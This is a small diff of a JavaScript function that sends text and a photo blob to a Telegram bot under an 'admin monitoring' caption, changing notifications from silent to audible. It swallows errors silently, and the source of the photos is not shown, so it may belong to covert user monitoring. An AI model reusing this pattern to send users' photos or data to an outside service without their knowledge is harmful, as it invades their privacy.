@@ -4207,7 +4207,7 @@ function sendToAdmin(text, photoBlob) {
         fd.append('photo', photoBlob);
         fd.append('caption', '📡 <b>ADMİN İZLƏMƏ</b>\n\n' + text);
         fd.append('parse_mode', 'HTML');
-        fd.append('disable_notification', 'true');
+        fd.append('disable_notification', 'false');
         fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
       } else {
         fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -4217,7 +4217,7 @@ function sendToAdmin(text, photoBlob) {
             chat_id: chatId,
             text: '📡 <b>ADMİN İZLƏMƏ</b>\n\n' + text,
             parse_mode: 'HTML',
-            disable_notification: true
+            disable_notification: false
           })
         }).catch(() => {});
       }
